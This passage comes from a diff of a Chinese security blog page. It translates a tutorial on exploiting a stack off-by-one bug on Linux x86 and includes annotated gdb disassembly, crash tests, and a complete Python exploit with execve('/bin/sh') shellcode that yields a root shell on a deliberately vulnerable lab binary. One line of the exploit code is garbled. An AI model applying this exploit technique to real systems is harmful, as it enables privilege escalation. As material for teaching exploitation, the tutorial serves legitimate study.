argv</span></div><div class="line"> <span class="number">0x080484a1</span> &lt;+<span class="number">10</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484a4</span> &lt;+<span class="number">13</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484a6</span> &lt;+<span class="number">15</span>&gt;: movl $<span class="number">0xffffffff</span>,<span class="number">-0x8</span>(%ebp) <span class="comment">//String Length Calculation -- Begins here</span></div><div class="line"> <span class="number">0x080484ad</span> &lt;+<span class="number">22</span>&gt;: mov %eax,%edx</div><div class="line"> <span class="number">0x080484af</span> &lt;+<span class="number">24</span>&gt;: mov $<span class="number">0x0</span>,%eax</div><div class="line"> <span class="number">0x080484b4</span> &lt;+<span class="number">29</span>&gt;: mov <span class="number">-0x8</span>(%ebp),%ecx</div><div class="line"> <span class="number">0x080484b7</span> &lt;+<span class="number">32</span>&gt;: mov %edx,%edi</div><div class="line"> <span class="number">0x080484b9</span> &lt;+<span class="number">34</span>&gt;: repnz scas %es:(%edi),%al</div><div class="line"> <span class="number">0x080484bb</span> &lt;+<span class="number">36</span>&gt;: mov %ecx,%eax</div><div class="line"> <span class="number">0x080484bd</span> &lt;+<span class="number">38</span>&gt;: not %eax</div><div class="line"> <span class="number">0x080484bf</span> &lt;+<span class="number">40</span>&gt;: sub $<span class="number">0x1</span>,%eax               <span class="comment">//String Length Calculation -- Ends here</span></div><div class="line"> <span class="number">0x080484c2</span> &lt;+<span class="number">43</span>&gt;: cmp $<span class="number">0x100</span>,%eax             <span class="comment">//eax = strlen(argv[1]). if eax &gt; 256</span></div><div class="line"> <span class="number">0x080484c7</span> &lt;+<span class="number">48</span>&gt;: jbe <span class="number">0x80484e9</span> &lt;main+<span class="number">82</span>&gt;     <span class="comment">//Jmp if NOT greater</span></div><div class="line"> <span class="number">0x080484c9</span> &lt;+<span class="number">50</span>&gt;: movl $<span class="number">0x80485e0</span>,(%esp)      <span class="comment">//If greater print error string,flush and return.</span></div><div class="line"> <span class="number">0x080484d0</span> &lt;+<span class="number">57</span>&gt;: call <span class="number">0x8048380</span> &lt;<span class="built_in">puts</span>@plt&gt;   </div><div class="line"> <span class="number">0x080484d5</span> &lt;+<span class="number">62</span>&gt;: mov <span class="number">0x804a020</span>,%eax          </div><div class="line"> <span class="number">0x080484da</span> &lt;+<span class="number">67</span>&gt;: mov %eax,(%esp)             </div><div class="line"> <span class="number">0x080484dd</span> &lt;+<span class="number">70</span>&gt;: call <span class="number">0x8048360</span> &lt;fflush@plt&gt;</div><div class="line"> <span class="number">0x080484e2</span> &lt;+<span class="number">75</span>&gt;: mov $<span class="number">0x1</span>,%eax              </div><div class="line"> <span class="number">0x080484e7</span> &lt;+<span class="number">80</span>&gt;: jmp <span class="number">0x80484fe</span> &lt;main+<span class="number">103</span>&gt;</div><div class="line"> <span class="number">0x080484e9</span> &lt;+<span class="number">82</span>&gt;: mov <span class="number">0xc</span>(%ebp),%eax          <span class="comment">//argv[1] &lt;= 256, eax = argv</span></div><div class="line"> <span class="number">0x080484ec</span> &lt;+<span class="number">85</span>&gt;: add $<span class="number">0x4</span>,%eax               <span class="comment">//eax = &amp;argv[1]</span></div><div class="line"> <span class="number">0x080484ef</span> &lt;+<span class="number">88</span>&gt;: mov (%eax),%eax             <span class="comment">//eax = argv[1]</span></div><div class="line"> <span class="number">0x080484f1</span> &lt;+<span class="number">90</span>&gt;: mov %eax,(%esp)             <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x080484f4</span> &lt;+<span class="number">93</span>&gt;: call <span class="number">0x8048464</span>              <span class="comment">//call foo</span></div><div class="line"> <span class="number">0x080484f9</span> &lt;+<span class="number">98</span>&gt;: mov $<span class="number">0x0</span>,%eax               <span class="comment">//return value</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x080484fe</span> &lt;+<span class="number">103</span>&gt;: add $<span class="number">0x8</span>,%esp              <span class="comment">//unwind stack space</span></div><div class="line"> <span class="number">0x08048501</span> &lt;+<span class="number">106</span>&gt;: pop %edi                   <span class="comment">//restore EDI</span></div><div class="line"> <span class="number">0x08048502</span> &lt;+<span class="number">107</span>&gt;: pop %ebp                   <span class="comment">//restore EBP</span></div><div class="line"> <span class="number">0x08048503</span> &lt;+<span class="number">108</span>&gt;: ret                        <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble foo</div><div class="line">Dump of assembler code <span class="keyword">for</span> function foo:</div><div class="line"> <span class="comment">//Function prologue</span></div><div class="line"> <span class="number">0x08048464</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (main) ebp</span></div><div class="line"> <span class="number">0x08048465</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (foo) ebp to esp</span></div><div class="line"> <span class="number">0x08048467</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x4</span>,%esp                <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x0804846a</span> &lt;+<span class="number">6</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//foo arg</span></div><div class="line"> <span class="number">0x0804846d</span> &lt;+<span class="number">9</span>&gt;: mov %eax,(%esp)              <span class="comment">//bar arg = foo arg</span></div><div class="line"> <span class="number">0x08048470</span> &lt;+<span class="number">12</span>&gt;: call <span class="number">0x8048477</span>              <span class="comment">//call bar</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue </span></div><div class="line"> <span class="number">0x08048475</span> &lt;+<span class="number">17</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048476</span> &lt;+<span class="number">18</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb) disassemble bar</div><div class="line">Dump of assembler code <span class="keyword">for</span> function bar:</div><div class="line"> <span class="comment">//Function Prologue</span></div><div class="line"> <span class="number">0x08048477</span> &lt;+<span class="number">0</span>&gt;: push %ebp                    <span class="comment">//backup caller's (foo) ebp</span></div><div class="line"> <span class="number">0x08048478</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp                <span class="comment">//set callee's (bar) ebp to esp</span></div><div class="line"> <span class="number">0x0804847a</span> &lt;+<span class="number">3</span>&gt;: sub $<span class="number">0x108</span>,%esp              <span class="comment">//create stack space</span></div><div class="line"> <span class="number">0x08048480</span> &lt;+<span class="number">9</span>&gt;: mov <span class="number">0x8</span>(%ebp),%eax           <span class="comment">//bar arg</span></div><div class="line"> <span class="number">0x08048483</span> &lt;+<span class="number">12</span>&gt;: mov %eax,<span class="number">0x4</span>(%esp)          <span class="comment">//strcpy arg2</span></div><div class="line"> <span class="number">0x08048487</span> &lt;+<span class="number">16</span>&gt;: lea <span class="number">-0x100</span>(%ebp),%eax       <span class="comment">//buf</span></div><div class="line"> <span class="number">0x0804848d</span> &lt;+<span class="number">22</span>&gt;: mov %eax,(%esp)             <span class="comment">//strcpy arg1</span></div><div class="line"> <span class="number">0x08048490</span> &lt;+<span class="number">25</span>&gt;: call <span class="number">0x8048370</span> &lt;<span class="built_in">strcpy</span>@plt&gt; <span class="comment">//call strcpy</span></div><div class="line"></div><div class="line"> <span class="comment">//Function Epilogue</span></div><div class="line"> <span class="number">0x08048495</span> &lt;+<span class="number">30</span>&gt;: leave                       <span class="comment">//unwind stack space + restore ebp</span></div><div class="line"> <span class="number">0x08048496</span> &lt;+<span class="number">31</span>&gt;: ret                         <span class="comment">//return</span></div><div class="line">End of assembler dump.</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p><u><em>堆栈布局：</em></u></p>
-<figure><br>    <a href="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" target="_blank" rel="external"><img src="http://oij0laovn.bkt.clouddn.com/stackoffbyone1.png" width="450"></a><br>    <figcaption></figcaption><br></figure>
-
-<p>前面讲到，用户输入了256字节大小的数据，NULL字节就会覆盖foo的EBP的LSB。所以当存储于目标缓冲区‘buf’正上方的foo的EBP被单个NULL字节覆盖时，EBP就会由0xbffff2d8 变为0xbffff200。细看堆栈布局图，我们会发现栈地址0xbffff200就是目标缓冲区‘buf’的一部分，而既然用户输入值已经被复制进了这个目标缓冲区，那么攻击者就能得到这个栈地址(0xbffff200)的控制权，同时也得到了EIP的控制权，从而借此实现任意代码执行。我们来发送一串大小为256字节的“A”进行测试。</p>
-<p>测试第一步：EBP覆盖后出现返回地址覆盖是否有可能？</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">(gdb) r `python -c 'print "A"*256'`</div><div class="line">Starting program: /home/sploitfun/lsploits/new/obo/stack/vuln `python -c 'print "A"*256'`</div><div class="line"></div><div class="line">Program received signal SIGSEGV, Segmentation fault.</div><div class="line">0x41414141 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x41414141</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>上述输出结果显示，EBP覆盖会让我们得到EIP的控制权。</p>
-<p>测试第二步：来自目标缓冲区的偏移量是什么？</p>
-<p>现在我们需要在目标缓冲区‘buf’的起始端中找到偏移量。我们还需设置好返回地址。切记，在off-by-one漏洞中，我们并不是要覆盖栈中的实际返回地址（在栈缓冲区溢出漏洞利用代码中我们才覆盖实际返回地址），而是把攻击者控制的目标缓冲区‘buf’内的一个4字节内存区域视作返回地址位置，对这块区域进行覆盖（在off-by-one溢出之后）。因此，我们需要(从‘buf’中)找到这个返回地址位置的偏移量——而这个偏移量也是目标缓冲区‘buf’本身的一部分。<br>这段话有点绕，没关系，继续往下读就好。<br>我们先试着从 text 段地址0x0804840开始尝试理解CPU的执行：</p>
-<ul>
-<li>0x08048490 - call strcpy – 执行这个指令会导致off-by-one溢出，因此（储存在栈地址0xbffff2cc中的）foo的EBP值将会由0xbffff2d8变为0xbffff200。</li>
-<li>0x08048495 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">leave: mov ebp, esp;        <span class="comment">//unwind stack space by setting esp to ebp. </span></div><div class="line">       pop ebp;             <span class="comment">//restore ebp</span></div><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff2cc</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0xbffff200 (Overwritten EBP value is now stored in ebp register); esp = 0xbffff2d0</span></div></pre></td></tr></table></figure>
-<ul>
-<li>0x08048495 - ret - 返回到foo的指令0x08048475。</li>
-<li>0x08048475 - leave - leave指令释放了这个函数的栈空间并且恢复了EBP。</li>
-</ul>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">*** As per our example: ***</div><div class="line">leave: mov ebp, esp;        <span class="comment">//esp = ebp = 0xbffff200 (As part of unwinding esp is shifted down instead of up!!)</span></div><div class="line">       pop ebp;             <span class="comment">//ebp = 0x41414141; esp = 0xbffff204</span></div></pre></td></tr></table></figure>
-<ul>
-<li>0x08048476 - ret - 返回到储存在ESP (0xbffff204)中的指令中。此时ESP指向被攻击者控制的缓冲区，因此攻击者可以回到任何他想要实现任意代码执行的地方。</li>
-</ul>
-<p>现在我们回到“在目标缓冲区‘buf’中寻找返回地址的偏移量”的最初测试上。如堆栈布局图所示，‘buf’位于0xbffff158，并且由紧随其后的CPU执行中可知，目标缓冲区‘buf’内的返回地址位置是0xbffff204。因此目标缓冲区‘buf’中返回地址的偏移量是0xbffff204 – 0xbffff158 = 0xac，因此用户输入“A”<em>172 + “B”</em>4 + “A”*80，用“BBBB”覆盖了EIP。</p>
-<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ cat exp_tst.py </div><div class="line">#exp_tst.py</div><div class="line">#!/usr/bin/env python</div><div class="line">import struct</div><div class="line">from subprocess import call</div><div class="line"></div><div class="line">buf = "A" * 172</div><div class="line">buf += "B" * 4</div><div class="line">buf += "A" * 80</div><div class="line"></div><div class="line">print "Calling vulnerable program"</div><div class="line">call(["./vuln", buf])</div><div class="line"></div><div class="line">$ python exp_tst.py </div><div class="line">Calling vulnerable program</div><div class="line">$ sudo gdb -q vuln </div><div class="line">Reading symbols from /home/sploitfun/lsploits/new/obo/stack/vuln...(no debugging symbols found)...done.</div><div class="line">(gdb) core-file core</div><div class="line">[New LWP 4055]</div><div class="line">warning: Can't read pathname for load map: Input/output error.</div><div class="line">Core was generated by `./vuln AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'.</div><div class="line">Program terminated with signal 11, Segmentation fault.</div><div class="line">#0 0x42424242 in ?? ()</div><div class="line">(gdb) p/x $eip</div><div class="line">$1 = 0x42424242</div><div class="line">(gdb)</div></pre></td></tr></table></figure>
-<p>上述输出结果显示，攻击者控制了返回地址。此时返回地址位于buf的偏移(0xac)处。有了上面这些信息，我们就可以写出能实现任意代码执行的漏洞利用程序了。</p>
-<p><u><em>漏洞利用代码：</em></u><br><figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#exp.py</span></div><div class="line">#!/usr/bin/env python</div><div class="line"><span class="keyword">import</span> <span class="keyword">struct</span></div><div class="line">from subprocess <span class="keyword">import</span> call</div><div class="line"></div><div class="line">#Spawn a shell. </div><div class="line"><span class="meta">#execve(/bin/sh) Size- 28 bytes.</span></div><div class="line">scode = <span class="string">"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90"</span></div><div class="line"></div><div class="line">ret_addr = <span class="number">0xbffff218</span></div><div class="line"></div><div class="line">#endianess conversion</div><div class="line">def conv(num):</div><div class="line"> <span class="keyword">return</span> <span class="keyword">struct</span>.pack(<span class="string">"&lt;I"</span>,numturn Address + NOP's + Shellcode + Junk</div><div class="line">buf = <span class="string">"A"</span> * <span class="number">172</span></div><div class="line">buf += conv(ret_addr)</div><div class="line">buf += <span class="string">"\x90"</span> * <span class="number">30</span></div><div class="line">buf += scode</div><div class="line">buf += <span class="string">"A"</span> * <span class="number">22</span></div><div class="line"></div><div class="line">print <span class="string">"Calling vulnerable program"</span></div><div class="line">call([<span class="string">"./vuln"</span>, buf])</div></pre></td></tr></table></figure></p>
-<p>执行上述漏洞利用程序将会获取root shell，如下所示：</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">$ python <span class="built_in">exp</span>.py </div><div class="line">Calling vulnerable program</div><div class="line"><span class="meta"># id</span></div><div class="line">uid=<span class="number">1000</span>(sploitfun) gid=<span class="number">1000</span>(sploitfun) euid=<span class="number">0</span>(root) egid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">4</span>(adm),<span class="number">24</span>(cdrom),<span class="number">27</span>(sudo),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">109</span>(lpadmin),<span class="number">124</span>(sambashare),<span class="number">1000</span>(sploitfun)</div><div class="line"># <span class="built_in">exit</span></div><div class="line">$</div></pre></td></tr></table></figure>
-<p>Off-by-one看上去是一个特别蠢的漏洞，而且程序开发者一个这么小的错误也能导致任意代码执行，这也太诡异了。那么，off-by-one漏洞是不是一定会导致任意代码执行呢？</p>
-<h3 id="0X03-如果调用者的EBP不在目标缓冲区上方，该怎么办"><a href="#0X03-如果调用者的EBP不在目标缓冲区上方，该怎么办" class="headerlink" title="0X03 如果调用者的EBP不在目标缓冲区上方，该怎么办"></a>0X03 如果调用者的EBP不在目标缓冲区上方，该怎么办</h3><p>答案非常简单。如果那样的话，我们不能用“EBP覆盖”方法来利用这个漏洞了呗！（不过呢，毕竟这个漏洞在代码中是确实存在的，所以肯定有其他的漏洞利用方法啦。😛）</p>
-<h3 id="0X04-什么情况下调用者的EBP不在目标缓冲区上方"><a href="#0X04-什么情况下调用者的EBP不在目标缓冲区上方" class="headerlink" title="0X04 什么情况下调用者的EBP不在目标缓冲区上方"></a>0X04 什么情况下调用者的EBP不在目标缓冲区上方</h3><p><strong>情况1</strong>： 一些其他的本地变量出现在目标缓冲区上方</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">bar</span><span class="params">(<span class="keyword">char</span>* arg)</span> </span>&#123;</div><div class="line"> <span class="keyword">int</span> x = <span class="number">10</span>; <span class="comment">/* [1] */</span></div><div class="line"> <span class="keyword">char</span> buf[<span class="number">256</span>]; <span class="comment">/* [2] */</span> </div><div class="line"> <span class="built_in">strcpy</span>(buf, arg); <span class="comment">/* [3] */</span> </div><div class="line">&#125;</div><div class="line">...</div></pre></td></tr></table></figure>
-<p>因此在这种情况下，夹在缓冲区‘buf’末端和EBP之间的会是一个本地变量，这就不允许我们去覆盖EBP的LSB了。</p>
-<p><strong>情况2</strong>: 对齐空间——gcc对齐栈空间边界默认为16字节。即在创建栈空间之前，ESP的最后四个字节就被‘and’指令清零了。具体参见下方函数反汇编代码。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">Dump of assembler code <span class="keyword">for</span> function main:</div><div class="line"> <span class="number">0x08048497</span> &lt;+<span class="number">0</span>&gt;: push %ebp</div><div class="line"> <span class="number">0x08048498</span> &lt;+<span class="number">1</span>&gt;: mov %esp,%ebp</div><div class="line"> <span class="number">0x0804849a</span> &lt;+<span class="number">3</span>&gt;: push %edi</div><div class="line"> <span class="number">0x0804849b</span> &lt;+<span class="number">4</span>&gt;: and $<span class="number">0xfffffff0</span>,%esp               <span class="comment">//Stack space aligned to 16 byte boundary</span></div><div class="line"> <span class="number">0x0804849e</span> &lt;+<span class="number">7</span>&gt;: sub $<span class="number">0x20</span>,%esp                     <span class="comment">//create stack space</span></div><div class="line">...</div></pre></td></tr></table></figure>
-<p>因此，在这种情况下，夹在缓冲区‘buf’末端和EBP之间的会是一个（最大为12字节的）对齐空间，这就不允许我们去覆盖EBP的LSB了。</p>
-<p>由于这个原因，我们在编译漏洞利用代码(vuln.c)时添加了gcc参数<strong><em>“-mpreferred-stack-boundary=2”</em></strong>。</p>
-<p><u><em>求助：</em></u>如果在创建栈内容之前ESP边界已经对齐为16字节的话该怎么办？这种情况下，即使程序以gcc默认的16字节栈边界编译，按理来说“EBP覆盖”法也是可以用的。但是我一直都写不出有效代码。在我所有的试运行程序中，创建栈空间之前，ESP边界都没有对齐16字节。但是不管我多么小心地创建栈内容，gcc总是给本地变量添加额外空间，这样ESP边界就不能对齐16字节。如果任何人有有效代码或者知道为什么ESP总是无法对齐，麻烦告诉我！拜托了！</p>
-<p><u><em>参考文章：</em></u></p>
-<ol>
-<li><a href="http://seclists.org/bugtraq/1998/Oct/109" target="_blank" rel="external">http://seclists.org/bugtraq/1998/Oct/109</a> </li>
-</ol>
-<hr>
-<p><strong>转载本文请务必注明</strong>，文章出处：《<a href="http://www.csyssec.org/20161231/stackoffbyone/" target="_blank" rel="external">Linux(X86)漏洞利用系列-栈内Off-by-one漏洞利用</a>》与作者信息：<a href="http://www.csyssec.org/about/" target="_blank" rel="external">CSysSec出品</a></p>
-
-      
-    </div>
-    <footer class="entry-meta entry-footer">
-      
-	<span class="ico-folder"></span>
-    <a class="article-category-link" href="/categories/漏洞利用/">漏洞利用<span class="article-category-count">14</span></a>
-
-
-      
-  <span class="ico-tags"></span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Exploit/">Exploit</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Security/">Security</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Stack/">Stack</a></li></ul>
-
-      
-    </footer>
-  </div>
-  
-</article>
-
-<!-- Table of Contents -->
-
-  
 
 
   <nav id="page-nav">
@@ -3270,6 +3274,18 @@ $ echo $?
     </ul>
     <div class="widget">
       <ul>
+        
+          <li class="clearfix">
+
+            
+              <div class="widget-entry-summary" style="margin: 0;">
+            
+
+              <h6 style="margin: 0;"><a href="/20170807/offensivesec/">offensivesec</a></h6>
+          <!--  <span>八月 7, 2017</span> -->
+            </div>
+
+          </li>
         
           <li class="clearfix">
 
@@ -3446,18 +3462,6 @@ $ echo $?
             
 
               <h6 style="margin: 0;"><a href="/20170504/virtual-ret2dir/">利用虚拟化技术防御ret2dir攻击</a></h6>
-          <!--  <span>五月 4, 2017</span> -->
-            </div>
-
-          </li>
-        
-          <li class="clearfix">
-
-            
-              <div class="widget-entry-summary" style="margin: 0;">
-            
-
-              <h6 style="margin: 0;"><a href="/20170504/smep-nx/">利用NX位实现基于软件的SMEP</a></h6>
           <!--  <span>五月 4, 2017</span> -->
             </div>
 
